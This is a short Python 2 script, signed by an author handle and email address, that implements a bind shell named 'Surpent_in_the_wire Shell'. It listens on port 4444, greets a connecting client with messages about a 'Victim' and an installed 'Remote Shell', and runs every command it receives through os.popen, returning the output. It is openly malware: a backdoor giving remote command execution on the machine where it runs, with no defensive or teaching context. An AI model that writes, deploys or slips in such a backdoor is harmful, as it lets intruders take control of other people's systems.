"""
Surpent_in_the_wire Shell 
Author : Surpent_in_the_wire
Email : surpentinthewire@gmail.com
[!] use netcat to connect ^.^
"""
import subprocess
import socket
import sys
import os
host = "127.0.0.1"; #! address to bind on.
port = int(4444);
while True:
        try:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
                s.bind((host,port));
                s.listen(4);
                while True:
                        c,addr=s.accept();
                        c.send("[*] Connected to Victim [ %s : %s ] Successfully\n"%(addr[0],port));
                        c.send('[!] Remote Shell Installed Successfully.\n\n');
                        for tym in range(0,50):
                                data=c.recv(1024);
                                for line in os.popen(data):
                                        c.send(line);
        except KeyboardInterrupt:
                c.send("\n\t[ctrl+c] server forcely closed by Victim.\n");
                s.close();
                sys.exit(1);
        except socket.error:
                print "\n\t[error] Address { %s : %s } already in use."%(host,port);
                print "\t[error] just wait a bit until we correct it for you.";
                s.close();
                print "\n\ntrying again ....";